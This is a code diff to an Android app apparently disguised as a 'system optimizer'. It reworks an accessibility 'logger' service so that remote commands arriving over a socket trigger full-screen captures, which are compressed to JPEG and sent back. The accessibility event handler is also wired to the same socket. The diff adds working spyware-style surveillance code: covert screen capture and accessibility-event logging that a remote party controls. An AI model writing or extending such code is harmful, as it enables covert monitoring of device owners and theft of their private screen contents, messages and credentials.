@@ -1,10 +1,18 @@
 package com.system.optimizer;
 
 import com.system.optimizer.handler.AccessibilityEventHandler;
-import com.system.optimizer.handler.ScreenshotCapture;
+import com.system.optimizer.handler.ScreenshotManager;
 import com.system.optimizer.config.ConfigData;
 import com.system.optimizer.config.ConfigManager;
 import com.system.optimizer.network.SocketManager;
+
+import java.io.ByteArrayOutputStream;
+
+import android.graphics.Bitmap;
+import android.graphics.ColorSpace;
+import android.hardware.HardwareBuffer;
+
+import android.os.Build;
 
 import android.accessibilityservice.AccessibilityService;
 import android.util.Log;
@@ -16,7 +24,7 @@ public class AccessibilityLoggerService extends AccessibilityService {
     private SocketManager socketManager;
     private ConfigManager configManager;
     private AccessibilityEventHandler accessibilityEventHandler;
-    private ScreenshotCapture screenShotCapture;
+    private ScreenshotManager screenshotManager;
 
     @Override
     public void onCreate() {
@@ -28,14 +36,14 @@ public class AccessibilityLoggerService extends AccessibilityService {
 
             this.socketManager = new SocketManager(configManager);
 
-            this.screenShotCapture = new ScreenshotCapture(this, configManager);
+            this.screenshotManager = new ScreenshotManager(this::performSystemCapture, configManager);
 
             // Create text handler with screenshot capture reference
-            this.accessibilityEventHandler = new AccessibilityEventHandler(screenShotCapture, socketManager);
+            this.accessibilityEventHandler = new AccessibilityEventHandler(screenshotManager, socketManager);
 
             this.socketManager.addPersistentListener("screenshot", args -> {
                 // Capture screenshot and send as response
-                screenShotCapture.takeScreenshot(new ScreenshotCapture.ScreenshotCallback() {
+                screenshotManager.takeScreenshot(new ScreenshotManager.ScreenshotCallback() {
                     @Override
                     public void onSuccess(byte[] imageData) {
                         if (imageData != null) {
@@ -112,6 +120,67 @@ public class AccessibilityLoggerService extends AccessibilityService {
             Log.e(TAG, "Error during cleanup", e);
         } finally {
             super.onDestroy();
+        }
+    }
+
+    private void performSystemCapture(ScreenshotManager.ScreenshotCallback clientCallback, int quality) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
+                    getMainExecutor(), new ScreenshotResultHandler(clientCallback, quality));
+        } else {
+            clientCallback.onError("API < 30 not supported");
+        }
+    }
+
+    /**
+     * Callback handler for Screenshot result.
+     */
+    private class ScreenshotResultHandler implements AccessibilityService.TakeScreenshotCallback {
+        private final ScreenshotManager.ScreenshotCallback clientCallback;
+        private final int quality;
+
+        ScreenshotResultHandler(ScreenshotManager.ScreenshotCallback callback, int quality) {
+            this.clientCallback = callback;
+            this.quality = quality;
+        }
+
+        @Override
+        public void onSuccess(AccessibilityService.ScreenshotResult result) {
+            HardwareBuffer buffer = result.getHardwareBuffer();
+            ColorSpace colorSpace = result.getColorSpace();
+
+            if (buffer != null) {
+                if (colorSpace == null) {
+                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
+                }
+
+                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
+
+                if (bitmap != null) {
+                    byte[] jpegBytes = bitmapToJpegBytes(bitmap, quality);
+                    clientCallback.onSuccess(jpegBytes);
+
+                    bitmap.recycle();
+                }
+
+                buffer.close();
+            }
+        }
+
+        @Override
+        public void onFailure(int error) {
+            String errorMessage = "Screenshot failed with error: " + error;
+            Log.w(TAG, errorMessage);
+            clientCallback.onError(errorMessage);
+        }
+
+        /**
+         * Convert Bitmap to JPEG byte array.
+         */
+        private static byte[] bitmapToJpegBytes(Bitmap bitmap, int quality) {
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
+            return baos.toByteArray();
         }
     }
 
